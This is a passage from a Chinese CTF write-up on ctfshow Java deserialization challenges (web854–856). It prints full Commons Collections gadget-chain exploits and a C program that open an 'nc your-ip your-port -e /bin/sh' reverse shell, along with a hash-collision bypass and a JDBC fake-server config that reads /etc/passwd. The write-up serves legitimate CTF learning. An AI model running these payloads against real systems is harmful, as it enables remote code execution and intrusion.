class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;evo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">bc</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bc.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(badAttributeValueExpException);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC6改-1"><a href="#CC6改-1" class="headerlink" title="CC6改"></a>CC6改</h3><p>同样的道理，可以发现CC6里面也只有<code>LazyMap</code>不能用罢了，改成<code>DefaultedMap</code>就可以了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> show.ctf.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web854</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;nc your-ip your-port -e /bin/sh&quot;</span>&#125;)</span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">DefaultedMap</span> <span class="variable">defaultedMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultedMap</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(defaultedMap,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;evo2&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(map);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web855"><a href="#web855" class="headerlink" title="web855"></a>web855</h2><p>提示说<code>我是java8，没有使用额外的库</code>，然后给了源码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">0x36d</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String OBJECTNAME=<span class="string">&quot;ctfshow&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SECRET=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  String shellCode=<span class="string">&quot;chmod +x ./&quot;</span>+OBJECTNAME+<span class="string">&quot; &amp;&amp; ./&quot;</span>+OBJECTNAME;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">magic</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">        <span class="keyword">if</span>(magic==<span class="number">2135247942</span>)&#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">var1</span> <span class="operator">=</span> in.readByte();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">switch</span> (var1)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">                    <span class="keyword">if</span>(var2==<span class="number">0x36d</span>)&#123;</span><br><span class="line"> </span><br><span class="line">                        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(OBJECTNAME);</span><br><span class="line">                        fileOutputStream.write(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x7f</span>,<span class="number">0x45</span>,<span class="number">0x4c</span>,<span class="number">0x46</span>&#125;);</span><br><span class="line">                        <span class="type">byte</span>[] temp = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">while</span>((in.read(temp))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                            fileOutputStream.write(temp);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                        fileOutputStream.close();</span><br><span class="line">                        in.close();</span><br><span class="line"> </span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:&#123;</span><br><span class="line"> </span><br><span class="line">                    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> in.readFields();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;username&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;password&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    username = username.replaceAll(<span class="string">&quot;[\\p&#123;C&#125;\\p&#123;So&#125;\uFE00-\uFE0F\\x&#123;E0100&#125;-\\x&#123;E01EF&#125;]+&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                            .replaceAll(<span class="string">&quot; &#123;2,&#125;&quot;</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">                    password = password.replaceAll(<span class="string">&quot;[\\p&#123;C&#125;\\p&#123;So&#125;\uFE00-\uFE0F\\x&#123;E0100&#125;-\\x&#123;E01EF&#125;]+&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                            .replaceAll(<span class="string">&quot; &#123;2,&#125;&quot;</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">                    <span class="type">User</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(username,password);</span><br><span class="line">                    <span class="type">User</span> <span class="variable">admin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(OBJECTNAME,SECRET);</span><br><span class="line">                    <span class="keyword">if</span>(var3 <span class="keyword">instanceof</span>  User)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(OBJECTNAME.equals(var3.getUsername()))&#123;</span><br><span class="line">                            <span class="keyword">throw</span>  <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;object unserialize error&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(SECRET.equals(var3.getPassword()))&#123;</span><br><span class="line">                            <span class="keyword">throw</span>  <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;object unserialize error&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(var3.equals(admin))&#123;</span><br><span class="line">                            Runtime.getRuntime().exec(shellCode);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">throw</span>  <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;object unserialize error&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span>:&#123;</span><br><span class="line">                    <span class="keyword">throw</span>  <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;object unserialize error&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> User)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) o;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.hashCode() == user.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username.hashCode()+password.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下这个类可以发现，在<code>case 1</code>这里可以写入我们的恶意文件，给的拿个固定开头是<code>elf</code>文件头，而在<code>case 2</code>这里则可以执行我们的恶意文件，所以思路是通过<code>case 1</code>写入我们的恶意可执行文件，然后在<code>case 2</code>这里执行恶意文件，先写一个恶意文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">system(<span class="string">&quot;nc your-ip your-port -e /bin/sh&quot;</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>gcc</code>编译生成可执行文件后删去前4个字节，重写一下<code>User</code>的<code>writeObject</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream outputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    outputStream.writeInt(<span class="number">2135247942</span>);</span><br><span class="line">    outputStream.writeByte(<span class="number">1</span>);</span><br><span class="line">    outputStream.writeInt(<span class="number">0x36d</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">hack</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;hack&quot;</span>);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bufferedInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(hack));</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(<span class="number">1024</span>);</span><br><span class="line">    <span class="type">byte</span>[] temp = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((size = bufferedInputStream.read(temp))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        byteArrayOutputStream.write(temp,<span class="number">0</span>,size);</span><br><span class="line">    &#125;</span><br><span class="line">    bufferedInputStream.close();</span><br><span class="line">    <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">    outputStream.write(bytes);</span><br><span class="line">    outputStream.defaultWriteObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成写入恶意文件的<code>payload</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web855</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;evo1&quot;</span>, <span class="string">&quot;evo1&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传过去可以生成恶意文件，然后<code>case 2</code>需要满足几个条件，就是实例化时传入的<code>username</code>和<code>password</code>不能是<code>ctfshow</code>和<code>123456</code>，但是hash比较时又相等，这里直接用一下<a href="https://blog.csdn.net/miuzzx/article/details/128303093">yu22x师傅的脚本</a>找一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hashcode</span>(<span class="params">val</span>):</span><br><span class="line">    h=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(val)):</span><br><span class="line">        h=<span class="number">31</span> * h + <span class="built_in">ord</span>(val[i])</span><br><span class="line">    <span class="keyword">return</span> h </span><br><span class="line">t=<span class="string">&quot;ct&quot;</span></span><br><span class="line"><span class="comment">#t=&quot;12&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> t!=(<span class="built_in">chr</span>(k)+<span class="built_in">chr</span>(l)):</span><br><span class="line">            <span class="keyword">if</span>(hashcode(t)==hashcode(<span class="built_in">chr</span>(k)+<span class="built_in">chr</span>(l))):</span><br><span class="line">                <span class="built_in">print</span>(t,<span class="built_in">chr</span>(k)+<span class="built_in">chr</span>(l))</span><br></pre></td></tr></table></figure><p>最后发现可以用<code>dU</code>和<code>0Q</code>替代<code>ct</code>和<code>12</code>，先重写一下<code>writeObject</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream outputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    outputStream.writeInt(<span class="number">2135247942</span>);</span><br><span class="line">    outputStream.writeByte(<span class="number">2</span>);</span><br><span class="line">    outputStream.defaultWriteObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成第二步要用的<code>payload</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web855</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;dUfshow&quot;</span>, <span class="string">&quot;0Q3456&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web856"><a href="#web856" class="headerlink" title="web856"></a>web856</h2><blockquote><p><a href="https://www.anquanke.com/post/id/203086">MySQL JDBC 客户端反序列化漏洞分析</a></p></blockquote><p>JDBC反序列化，看一下上面这篇文章然后把工具下载下来就可以。把<code>MySQL_Fake_Server</code>部署到自己的<code>vps</code>上，先配置下<code>config.json</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ysoserialPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;你的ysoserial的绝对路径&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;javaBinPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fileOutputDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;./fileOutput/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;displayFileContentOnScreen&quot;</span><span class="punctuation">:</span><span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;saveToFile&quot;</span><span class="punctuation">:</span><span class="keyword">true</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;fileread&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;win_ini&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\win.ini&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;win_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;linux_passwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/passwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;linux_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index_php&quot;</span><span class="punctuation">:</span><span class="string">&quot;index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ssrf&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://www.baidu.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__defaultFiles&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span 